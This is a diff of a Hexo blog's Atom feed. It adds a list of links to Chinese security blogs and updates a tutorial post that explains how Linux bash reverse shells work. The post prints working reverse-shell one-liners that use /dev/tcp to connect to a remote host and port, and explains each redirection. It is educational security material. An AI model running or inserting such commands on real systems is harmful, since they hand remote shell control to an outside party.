@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-25T11:41:38.828Z</updated>
+  <updated>2019-11-25T14:22:01.061Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>大佬博客</title>
+    <link href="http://yoursite.com/2019/11/25/%E5%A4%A7%E4%BD%AC%E5%8D%9A%E5%AE%A2/"/>
+    <id>http://yoursite.com/2019/11/25/大佬博客/</id>
+    <published>2019-11-25T14:22:00.960Z</published>
+    <updated>2019-11-25T14:22:01.061Z</updated>
+    
+    <content type="html"><![CDATA[<p>大佬博客</p><p>链接</p><ul><li><a href="https://www.t00ls.net/" target="_blank" rel="noopener">T00LSwww.t00ls.net</a></li><li><a href="https://www.secquan.org/" target="_blank" rel="noopener">SecQuanwww.secquan.org</a></li><li><a href="https://www.0xnull.org/" target="_blank" rel="noopener">0xNULLwww.0xnull.org</a></li><li><a href="http://xssor.io/" target="_blank" rel="noopener">XSS ORxssor.io</a></li><li><a href="http://www.xuzhengfu.com/" target="_blank" rel="noopener">Zheng-Fu Xuwww.xuzhengfu.com</a></li><li><a href="http://www.storysec.com/" target="_blank" rel="noopener">影风www.storysec.com</a></li><li><a href="https://xxwhite.com/" target="_blank" rel="noopener">叉叉白xxwhite.com</a></li><li><a href="https://blog.xttf.fun/" target="_blank" rel="noopener">XTTFblog.xttf.fun</a></li><li><a href="http://www.menzel3.fun/" target="_blank" rel="noopener">Menzel3www.menzel3.fun</a></li><li><a href="https://assassins-white.github.io/" target="_blank" rel="noopener">Assassins 小白assassins-white.github.io</a></li><li><a href="https://www.7ooc.cn/" target="_blank" rel="noopener">Eugenewww.7ooc.cn</a></li><li><a href="https://blogs.kainy.cn/" target="_blank" rel="noopener">Freetaoblogs.kainy.cn</a></li><li><a href="https://lengjibo.github.io/" target="_blank" rel="noopener">冷逸lengjibo.github.io</a></li><li><a href="https://baishunxd.github.io/" target="_blank" rel="noopener">Calendulabaishunxd.github.io</a></li><li><a href="https://hfone.github.io/" target="_blank" rel="noopener">HTFhfone.github.io</a></li><li><a href="http://shana.wiki/" target="_blank" rel="noopener">Shanashana.wiki</a></li><li><a href="http://www.recorday.cn/" target="_blank" rel="noopener">C0d3r1iuwww.recorday.cn</a></li><li><a href="http://caiyuhuan.com/" target="_blank" rel="noopener">CYHcaiyuhuan.com</a></li><li><a href="https://linuz.me/" target="_blank" rel="noopener">Linuzlinuz.me</a></li><li><a href="https://plz227.github.io/" target="_blank" rel="noopener">Plzplz227.github.io</a></li><li><a href="http://blog.leanote.com/snowming" target="_blank" rel="noopener">Snowmingblog.leanote.</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;大佬博客&lt;/p&gt;
+&lt;p&gt;链接&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.t00ls.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;T00LSwww.t00ls.net&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>src链接</title>
@@ -89,7 +115,7 @@
     <link href="http://yoursite.com/2019/11/23/%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/"/>
     <id>http://yoursite.com/2019/11/23/反弹shell原理/</id>
     <published>2019-11-23T15:30:12.587Z</published>
-    <updated>2019-11-23T15:29:56.570Z</updated>
+    <updated>2019-11-25T13:50:28.224Z</updated>
     
     <content type="html"><![CDATA[<h1><span id="linux-fan-dan-shell-shou-fa">linux反弹shell手法</span><a href="#linux-fan-dan-shell-shou-fa" class="header-anchor">#</a></h1><ol><li>sh/bash:</li></ol><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  -i  &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.21.1/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> </span><br><span class="line">/bin/sh  -i  &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.21.1/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>先解释下相关概念0表示标准输入（默认键盘），1表示标准输出（默认显示器），2表示错误输出(默认显示器)<br>0&gt;&amp;1表示将标准输入重定向到标准输出 ，0&gt;1表示将标准输入重定向到文件名为1的文件，&amp;就是用来区分的标识符<br>还有linux是默认不把错误信息重定向到文件的，如图test3中并没有错误信息,而且两次命令得到的结果一样，即cmd &gt;file 等同于 cmd 1&gt;file</p><p><img src="https://upload-images.jianshu.io/upload_images/1011862-f2dc635541043acd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/534/format/webp" alt="img"></p><p>image.png</p><p>bash -i 生成一个交互式的子进程<br>/dev/tcp/192.168.21.1/8080 linux一切皆文件思想，其实就是与192.168.21.1:8080建立tcp连接<br>/bin/bash -i &gt; /dev/tcp/192.168.21.1/8080 表示bash子进程的标准输出重定向到远程的8080端口</p><p><img src="https://upload-images.jianshu.io/upload_images/1011862-2a666a408614db66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/674/format/webp" alt="img"></p><p>image.png</p><p>由上图可以看到执行成功的命令id,pwd的结果都重定向到了远程8080，但是错误信息却直接输出到了屏幕，这就是上面说的linux是默认不把错误输出（也就是2）重定向到文件，所以需要再加上 2&gt;&amp;1（等同于&gt;&amp;）,即将错误输出也重定向到标准输出,因为标准输出已经重定向到了8080，所以错误输出也重定向到远程端口8080。</p><p>现在实现了将受害者的命令结果重定向到了远程的8080端口，但是作为交互式shell来说，我们还需要直接在监听端直接输入命令。我们再添加0&gt;&amp;1,表示将标准输入重定向到标准输出，和上面一样，标准输出已经重定向到了/dev/tcp/192.168.21.1/8080，所以标准输入也重定向到了远程，这样就可以在远端直接输入命令了。这就是网络上盛传的bash反弹shell的原理。<br>bash -i &gt; /dev/tcp/192.168.21.1/8080 0&gt;&amp;1 2&gt;&amp;1 即<br>bash -i &gt;&amp; /dev/tcp/192.168.21.1/8080 0&gt;&amp;1</p>]]></content>
     
